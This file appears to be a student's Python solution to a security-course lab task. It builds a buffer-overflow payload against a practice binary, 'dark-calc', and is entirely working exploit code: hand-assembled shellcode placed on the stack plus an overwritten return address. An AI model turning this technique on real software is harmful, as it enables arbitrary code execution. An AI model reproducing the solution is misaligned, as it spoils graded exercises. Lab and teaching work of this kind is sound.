#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

Stack-execution variant: the same gets() overflow in input() redirects the
saved return address into the 16-byte expression[] buffer, and the code that
runs on the stack calls grade_eval(4), which prints

    Hope A will be your grade!

    expression[] = 0x721000800fd0
    [ +0  .. +24)  shellcode
    [ +24 .. +32)  return address = 0x721000800fd0

Only 0x30 bytes exist between expression[] and the guard page, so rsp is
lowered by 0x60 before the call: grade_eval's frame would otherwise be built
on top of this shellcode.  A `ret`/`syscall` exit keeps the process from
falling through into the return-address slot.
"""
import struct
import sys

EXPR = 0x721000800FD0
GRADE_EVAL = 0x401A87


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


shellcode = b""
shellcode += b"\x6a\x04"                        # push 4
shellcode += b"\x5f"                            # pop  rdi         (arg = 4)
shellcode += b"\x48\x83\xec\x60"                # sub  rsp, 0x60   (clear of payload)
shellcode += b"\xb8" + struct.pack("<I", GRADE_EVAL)  # mov eax, grade_eval
shellcode += b"\xff\xd0"                        # call rax
shellcode += b"\xb8\x3c\x00\x00\x00"            # mov  eax, 60 (exit)
shellcode += b"\x31\xff"                        # xor  edi, edi
shellcode += b"\x0f\x05"                        # syscall
shellcode += b"\x90"                            # pad to the return-address slot
assert len(shellcode) == 24, len(shellcode)

payload = shellcode + p64(EXPR)
sys.stdout.buffer.write(payload)
